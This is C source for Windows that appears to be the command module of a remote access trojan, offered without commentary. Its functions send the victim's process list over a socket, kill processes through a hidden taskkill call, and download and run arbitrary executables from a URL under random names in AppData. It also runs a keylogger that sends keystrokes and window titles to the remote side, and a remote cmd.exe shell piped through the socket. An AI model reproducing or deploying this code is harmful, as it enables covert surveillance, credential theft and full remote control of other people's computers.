#include "cmd.h"

void WINAPI SendProcessList(SOCKET sock)
{
	PROCESSENTRY32 pe32;
	HANDLE snapshot = NULL;
	HANDLE hProcess = NULL;
	DWORD ProcessID = 0;
	char buffer[127];

	if ((snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) != INVALID_HANDLE_VALUE)
	{
		RtlZeroMemory(&pe32, sizeof(PROCESSENTRY32));
		pe32.dwSize = sizeof(PROCESSENTRY32);
		Process32First(snapshot, &pe32);
		do
		{
			lstrcpyA(buffer, pe32.szExeFile);
			lstrcatA(buffer, "\n");
			send(sock, buffer, lstrlenA(buffer), 0);
		} while (Process32Next(snapshot, &pe32));
	}
		
	CloseHandle(snapshot);
}

void WINAPI KillProcess(SOCKET sock, char *process)
{
	char win[MAX_PATH];
	char cmd[MAX_PATH];

	GetWindowsDirectory(win, sizeof(win));
	lstrcatA(win, "\\system32");
	ZeroMemory(cmd, sizeof(cmd));
	lstrcatA(cmd, " /im ");
	process[lstrlen(process)-1] = 0;
	lstrcatA(cmd, process);
	lstrcatA(cmd, " /f");
	if (int(ShellExecuteA(0, "open", "taskkill.exe", cmd, win, SW_HIDE)) > 32)
	{
		SendData(sock, "remote> command executed succesfully\n");
	}
}

void GetRandFileName(char *filename, char *extension, DWORD length)
{
	srand(time(NULL));

	for (size_t i = 0; i < length; i++)
	{
		char rand_char = rand() % 25 + 'a';
		filename[i] = rand_char;
	}

	lstrcatA(filename, extension);
}

void WINAPI DownloadFile(SOCKET sock, char *url)
{
	PWSTR roaming = NULL;
	char filename[50];
	char fullpath[MAX_PATH];

	HRESULT hr = SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &roaming);
	if (SUCCEEDED(hr))
	{
		ZeroMemory(filename, sizeof(filename));
		ZeroMemory(fullpath, MAX_PATH);

		WideCharToMultiByte(CP_ACP, 0, roaming, lstrlenW(roaming), fullpath, sizeof(fullpath), NULL, NULL);
		GetRandFileName(filename, ".exe", 10);
		lstrcatA(fullpath, "\\");
		lstrcatA(fullpath, filename);

		URLDownloadToFile(0, url, fullpath, 0, 0);
		Sleep(1000);
		WinExec(fullpath, SW_SHOW);
	}

	CoTaskMemFree(roaming);
}

/* Retrieves the name of active window. Return 1 if active window was changed. */
int WINAPI GetActiveWindowTitle(char *buffer, int buf_size)
{
	static char last_title[256] = { 0 };

	HWND hwnd = GetForegroundWindow();
	GetWindowText(hwnd, buffer, buf_size);

	/* Save window title if it was changed */
	if (lstrcmp(buffer, last_title) != 0)
	{
		lstrcpy(last_title, buffer);
		return 1; /* Title was changed */
	}
	else return 0;
}

#define SHIFT   1
#define CONTROL 2
#define ALT		4

int WINAPI AppendToBuffer(char *buffer, unsigned char character, unsigned int state)
{
	unsigned int bufferlength = lstrlen(buffer);
    
    switch (character)
	{
        case VK_RETURN:
            *(buffer + bufferlength) = '\r';
            *(buffer + ++bufferlength) = '\n';
            break;
            
        case VK_TAB:
            lstrcat(buffer, "[TAB]");
            bufferlength += 4;
            break;
            
        case VK_BACK:
            lstrcat(buffer, "[BCK]");
            bufferlength += 4;
            break;

        case VK_CAPITAL:
            lstrcat(buffer, "[CAP]");
            bufferlength += 4;
            break;
            
        default:
            if (state & CONTROL)
			{
                char ctrlbuffer[9];

                wsprintf(ctrlbuffer, "[CTRL-%c]", character);
                lstrcat(buffer, ctrlbuffer);
                bufferlength += 7;
                
                break;
            }
            
            if (state & SHIFT)
			{
                *(buffer + bufferlength) = character;
            }
            else
			{
                /* numpad other entry (*, +, /, -, ., ...) */
                if (character >= 106 && character <= 111)
                    character -= 64;

                /* numpad number entry (1, 2, 3, 4, ...) */
                if (character >= 96 && character <= 105)
                    character -= 48;

                /* upper-case to lower-case conversion because shift is not pressed */
                if (character >= 65 && character <= 90)
                    character += 32;
                
                *(buffer + bufferlength) = character;
            }
            
            break;
    }
    
	return ++bufferlength;
}

int GetModifiers()
{
	int state = 0;

	if (GetAsyncKeyState(16))
		state |= SHIFT;
	if (GetAsyncKeyState(17))
		state |= CONTROL;
	if (GetAsyncKeyState(18))
		state |= ALT;

	return state;
}

void VirtualKeyToChar(int virtual_key)
{
	DWORD pid = 0;
	BYTE s[256];
	wchar_t u;

	HKL hkl = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), &pid));
	GetKeyboardState(s);
	ToUnicodeEx(virtual_key, MapVirtualKeyEx(virtual_key, MAPVK_VK_TO_CHAR, hkl), s, &u, sizeof(u), 0, hkl);

	WriteConsoleW(GetStdHandle(STD_OUTPUT_HANDLE), &u, 1, &pid, 0);
}

void WINAPI KeyLogger(SOCKET sock)
{
	char win_title[256] = { 0 };
	char log[256] = { 0 };
	int state = 0;
	int log_size = 0;
	const int max_log_size = 8;

	while (true)
    {
		Sleep(1);

		state = GetModifiers();

		for (int i = 0; i < 128; i++)
		{
			if (GetAsyncKeyState(i) == -32767)
			{
				VirtualKeyToChar(i);
				log_size = AppendToBuffer(log, i, state);
			}
			if(log_size >= max_log_size)
			{
				SendData(sock, "\r\n");
				if (GetActiveWindowTitle(win_title, 256))
				{
					SendData(sock, win_title);
					SendData(sock, "\r\n");
				}

				send(sock, log, log_size, 0);

				ZeroMemory(log, sizeof(log));
				log_size = 0;
			}
        }
    } 
}

void WINAPI GetConsole(SOCKET sock)
{
	char system_directory[MAX_PATH];
	// Create structures needed for work with pipes
	STARTUPINFO si = { 0 };
	SECURITY_ATTRIBUTES sa;
	PROCESS_INFORMATION pi;
	HANDLE new_stdout, new_stdin, read_stdout, write_stdin;

	GetSystemDirectory(system_directory, MAX_PATH);
	lstrcatA(system_directory, "\\cmd.exe");

	sa.lpSecurityDescriptor = NULL;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = true;

	// Create pipes
	if (!CreatePipe(&new_stdin, &write_stdin, &sa, 0))
	{
		return;
	}
	if (!CreatePipe(&read_stdout, &new_stdout, &sa, 0))
	{
		return;
	}

	// Replace descriptors
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.hStdError  = new_stdout;
	si.hStdOutput = new_stdout;
	si.hStdInput  = new_stdin;

	// Create child process
	if (!CreateProcess(system_directory, NULL, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
	{
		CloseHandle(new_stdin);
		CloseHandle(new_stdout);
		CloseHandle(read_stdout);
		CloseHandle(write_stdin);
		closesocket(sock);
		return;
	}
	char std_buff[1024];
	unsigned long exit_code = 0;	// Exit code
	unsigned long in_std = 0;		// Amount of bytes read from stdout
	unsigned long avail = 0;		// Amount of available bytes
	bool first_command = true;
	// Until process is finished, read/write from pipe to socket and vice versa
	while (GetExitCodeProcess(pi.hProcess, &exit_code) && (exit_code == STILL_ACTIVE))
	{
		PeekNamedPipe(read_stdout, std_buff, sizeof(std_buff) - 1, &in_std, &avail, NULL);
		ZeroMemory(std_buff, sizeof(std_buff));
		if (in_std != 0)
		{
			if (avail > (sizeof(std_buff) - 1))
			{
				while (in_std >= (sizeof(std_buff) - 1))
				{
					ReadFile(read_stdout, std_buff, sizeof(std_buff) - 1, &in_std, NULL); // Read from pipe
					send(sock, std_buff, strlen(std_buff), 0);
					ZeroMemory(std_buff, sizeof(std_buff));
				}
			}
			else
			{
				ReadFile(read_stdout, std_buff, sizeof(std_buff) - 1, &in_std, NULL);
				send(sock, std_buff, strlen(std_buff), 0);
				ZeroMemory(std_buff, sizeof(std_buff));
			}
		}
		unsigned long io_sock;
		// Check socket state, read from it and write to pipe
		if (!ioctlsocket(sock, FIONREAD, &io_sock) && io_sock)
		{
			ZeroMemory(std_buff, sizeof(std_buff));
			recv(sock, std_buff, 1, 0);
			if (first_command == false)
			{
				send(sock, std_buff, strlen(std_buff), 0); // For normal output to telnet
			}
			if (*std_buff == '\x0A')
			{
				WriteFile(write_stdin, "\x0D", 1, &io_sock, 0);
				first_command = false;
			}
			WriteFile(write_stdin, std_buff, 1, &io_sock, 0);
		}
		Sleep(1);
	}
}